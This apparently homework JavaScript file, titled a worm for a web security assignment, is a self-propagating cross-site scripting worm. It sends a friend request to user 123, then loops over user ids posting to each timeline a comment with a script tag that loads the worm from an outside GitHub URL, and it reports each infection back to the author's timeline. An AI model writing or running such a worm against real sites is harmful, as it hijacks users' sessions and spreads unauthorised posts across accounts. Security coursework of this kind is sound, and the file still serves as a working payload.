// Worm For HW6

// add myself as a friend
function add_friend() {
    var request = new XMLHttpRequest();
    request.open("GET", `/add_friend.php?id=123`, true);
    request.send();
}

add_friend();

// posts a comment on the user timeline. 
function add_comment(user_id, comment) {
    var request = new XMLHttpRequest();
    request.open("GET", `/add_comment.php?id=${user_id}&comment=${encodeURIComponent(comment)}`, true);
    request.send();
}

// posts a comment on my timeline
function add_report_comment(user_id) {
    add_comment(123, `New Friend Acquired: ${user_id}`)
}

// worm that loops
for(let user_id = 0; user_id < 300; user_id++) {
    if (user_id != 123) {
        add_comment(user_id, "<script src='https://raw.githubusercontent.com/P0nt14c/web/main/worm.js></script>")
        add_report_comment(user_id);
    }
}
